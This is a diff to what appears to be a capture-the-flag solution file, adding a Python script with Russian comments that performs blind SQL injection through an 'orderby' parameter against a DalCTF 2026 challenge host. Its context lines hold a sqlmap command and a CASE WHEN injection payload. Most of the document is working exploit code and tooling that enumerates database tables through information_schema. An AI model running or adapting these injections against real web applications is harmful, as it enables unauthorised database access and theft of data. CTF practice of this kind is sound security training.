@@ -239,3 +239,27 @@ if __name__ == "__main__":
 
 sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" --cookie="PHPSESSID=your_token" -p orderby --technique=TB --level=3 --risk=2 --dbms=mysql --batch
 ?orderby=(CASE+WHEN+(length((select+table_name+from+information_schema.tables+limit+0,1))>1)+THEN+id+ELSE+name+END)
+
+
+
+import requests
+
+URL = "http://dalctf-secureform-admin-39-64616c.instancer.dalctf2026.com/dashboard.php"
+# Твоя кука из браузера (посмотри в Network -> Request Headers)
+COOKIES = {"PHPSESSID": "ТВОЯ_КУКА"} 
+
+def check_condition(condition):
+    # Пейлоад: если условие истинно, сортируем по id (позиция 1, 2, 3...), если ложно - по name
+    payload = f"(CASE WHEN ({condition}) THEN id ELSE name END)"
+    params = {"orderby": payload, "order": "ASC"}
+    
+    resp = requests.get(URL, params=params, cookies=COOKIES)
+    # Если запись с ID 2 идет первой, значит сортировка по ID сработала (условие истинно)
+    return "Position: 1" in resp.text and "asdasd" in resp.text
+
+# Ищем длину первой таблицы
+for i in range(1, 20):
+    cond = f"(select length(table_name) from information_schema.tables limit 0,1) = {i}"
+    if check_condition(cond):
+        print(f"[+] Длина таблицы: {i}")
+        break
